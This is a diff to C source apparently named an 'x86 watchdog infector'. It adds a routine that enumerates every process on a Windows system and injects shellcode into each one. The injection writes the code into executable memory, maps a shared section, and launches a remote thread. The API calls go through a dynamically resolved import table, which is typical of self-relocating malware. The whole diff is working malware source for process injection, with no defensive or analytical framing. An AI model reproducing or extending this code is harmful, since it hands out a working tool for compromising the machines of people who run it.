@@ -3,89 +3,110 @@
 
 #include "x86-watchdog-infector.h"
 
-/* NTSYSAPI NTSTATUS
-ZwMapViewOfSection(HANDLE SectionHandle,
-                   HANDLE ProcessHandle,
-                   PVOID* BaseAddress,
-                   ULONG_PTR ZeroBits,
-                   SIZE_T CommitSize,
-                   PLARGE_INTEGER SectionOffset,
-                   PSIZE_T ViewSize,
-                   SECTION_INHERIT InheritDisposition,
-                   ULONG AllocationType,
-                   ULONG Win32Protect); */
+int
+try_infect_all_processes(struct dll_imports* imports,
+                         HANDLE section,
+                         PVOID shell_base,
+                         SIZE_T shell_size)
+{
+  int ret = 0;
+  PSYSTEM_PROCESS_INFORMATION p_spi;
+
+  if (process_list(imports, &p_spi) < 0) {
+    return -1;
+  }
+
+  do {
+    infect_process(
+      imports, section, shell_base, shell_size, (DWORD)p_spi->UniqueProcessId);
+
+    if (p_spi->NextEntryOffset == 0) {
+      break;
+    }
+
+    p_spi =
+      (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)p_spi) + p_spi->NextEntryOffset);
+  } while (1);
+
+  imports->VirtualFree(p_spi, 0, MEM_RELEASE);
+
+  return ret;
+}
 
 int
-infect_process(HANDLE section,
+infect_process(struct dll_imports* imports,
+               HANDLE section,
                PVOID shell_base,
                SIZE_T shell_size,
-               DWORD proc_id,
-               struct watchdog_info* map)
+               DWORD proc_id)
 {
   int ret = 0;
 
-  HANDLE proc =
-    OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
-                0,
-                proc_id);
+  HANDLE proc = imports->OpenProcess(PROCESS_CREATE_THREAD |
+                                       PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
+                                     0,
+                                     proc_id);
   if (proc == NULL) {
     return -1;
   }
 
-  PVOID p_remote = VirtualAllocEx(
-    proc, NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  PVOID p_remote = imports->VirtualAllocEx(
+    proc, NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
   if (p_remote == NULL) {
     ret = -2;
     goto close_proc;
   }
 
-  if (!WriteProcessMemory(proc, p_remote, shell_base, shell_size, NULL)) {
+  if (!imports->WriteProcessMemory(
+        proc, p_remote, shell_base, shell_size, NULL)) {
     ret = -3;
     goto free_remote;
   }
 
   PVOID p_section = NULL;
-  LARGE_INTEGER section_off;
   SIZE_T view_size;
-
-  section_off.HighPart = 0;
-  section_off.LowPart = sizeof *map;
 
   view_size = 0;
 
-  if (!NT_SUCCESS(NtMapViewOfSection(section,
-                                     proc,
-                                     &p_section,
-                                     0,
-                                     0,
-                                     &section_off,
-                                     &view_size,
-                                     /* ViewUnmap */ 2,
-                                     SEC_COMMIT,
-                                     PAGE_READWRITE))) {
+  if (!NT_SUCCESS(imports->NtMapViewOfSection(section,
+                                              proc,
+                                              &p_section,
+                                              0,
+                                              0,
+                                              NULL,
+                                              &view_size,
+                                              ViewUnmap,
+                                              0,
+                                              PAGE_READWRITE))) {
     ret = -4;
     goto free_remote;
   }
 
-  HANDLE thread =
-    CreateRemoteThread(proc, NULL, 0, ThreadProc, p_section, 0, NULL);
+  HANDLE thread = imports->CreateRemoteThread(
+    proc,
+    NULL,
+    0,
+    ((PVOID)(((ULONG)ThreadProc) - ((DWORD)GetModuleHandle(NULL)) +
+             ((DWORD)p_remote))),
+    p_section,
+    0,
+    NULL);
   if (thread == NULL) {
     ret = -5;
     goto unmap_section;
   }
 
-close_thread:
-  CloseHandle(thread);
+  imports->CloseHandle(thread);
 unmap_section:
   if (ret < 0) {
-    NtUnmapViewOfSection(proc, p_section);
+    imports->NtUnmapViewOfSection(proc, p_section);
   }
 free_remote:
   if (ret < 0) {
-    VirtualFreeEx(proc, p_remote, 0, MEM_RELEASE);
+    imports->VirtualFreeEx(proc, p_remote, 0, MEM_RELEASE);
   }
 close_proc:
-  CloseHandle(proc);
+  imports->CloseHandle(proc);
 
-  return 0;
+  return ret;
 }
